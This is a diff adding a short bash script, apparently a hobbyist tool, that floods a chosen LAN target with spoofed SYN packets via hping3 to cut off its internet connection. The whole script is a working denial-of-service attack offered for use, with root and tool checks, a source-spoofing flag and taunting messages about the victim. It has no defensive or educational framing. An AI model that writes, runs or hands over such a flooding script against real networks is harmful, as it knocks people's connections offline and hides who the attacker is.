@@ -1,0 +1,27 @@
+#!/usr/bin/env bash
+
+#DoSThatBitc4 is a simple script to DoS a LAN
+#Most of the home routers nowadays still dont have protections agains this script kiddie attack.
+
+#---------------------------------------------------------------------------------------------------
+#Testes
+
+[ ! -e /usr/sbin/hping3 ] && echo "Install Hping3 bro!\n" && exit 1  #hping3 instalado?
+[ ! "$(id -u)" = 0 ] && printf "U need to be root to run this\n" && exit 1    #Está rodando como root? Necessário!
+
+
+trap __Ctrl_c__ INT
+
+__Ctrl_c__() {
+    echo -e ${COR_AMARELO}"DONT U WANNA FUC4 THIS GUY?"
+    exit 1
+}
+
+
+case "$1" in
+  -h) echo -e "DosThatBitc4.sh IP ORIGEM DO SEU DESEJO + IP DO ALVO"                   ;;
+  *)  echo -e "MAKING HIS INTERNET CONNECTION GO AWAY!!!!! \n"
+      sudo hping3 --flood -S -a $1 $2 -m 5000 -x -w 4999 -d 1400 -p 80 &> /dev/null    ;;
+esac
+
+#Still working on the design
